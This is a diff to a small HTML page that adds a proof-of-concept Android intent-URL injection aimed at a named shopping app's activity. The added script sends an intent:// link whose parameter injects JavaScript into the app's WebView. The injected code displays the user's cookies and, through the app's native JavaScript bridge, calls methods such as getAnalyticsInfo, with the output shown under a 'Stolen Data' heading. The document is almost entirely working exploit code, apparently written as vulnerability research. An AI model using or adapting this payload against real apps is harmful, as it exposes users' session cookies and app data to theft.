@@ -12,11 +12,20 @@
 			<br>
 			<br>
 			<h3>
-				<a href="intent://site.com/hellosir#Intent;scheme=https;component=com.app.app/com.app.app.Activity;end">Visit our Store!</a>
+				<a id="testanchor" href="intent://site.com/hellosir#Intent;scheme=https;component=com.app.app/com.app.app.Activity;end">cVisit our Store!</a>
 				<br>
 				<br>
 			</h3>
 		</center>
+		<a id="testanchor">Open</a>
 
+<script>
+const intentUrl =
+"intent://partner-native-app.valmo.in?x=%27);document.body.style.padding=%2220px%22;document.body.style.wordWrap=%22break-word%22;document.body.style.overflowWrap=%22break-word%22;document.body.innerHTML=%22<div style=\\\"border:1px solid #000;padding:20px;max-width:100%;word-break:break-word;\\\">%22+decodeURIComponent(document.cookie)+%22</div>%22;if(window.ValmoAndroidInterface){document.body.innerHTML=%22<h2><center>Stolen Data:</center></<h2><strong>GETXO: </strong>%22+window.ValmoAndroidInterface.getXo()+%22<br><br>GETOX: %22+window.ValmoAndroidInterface.getOx()+%22<br><br>GETANALYTICSINFO: %22+window.ValmoAndroidInterface.getAnalyticsInfo();}//#Intent;scheme=https;package=com.valmo.valmo;component=com.valmo.valmo.home.ui.activities.HomeActivity;end";
+
+document.getElementById("testanchor").onclick = function () {
+    window.location.href = intentUrl;
+};
+</script>
 	</body>
 </html>
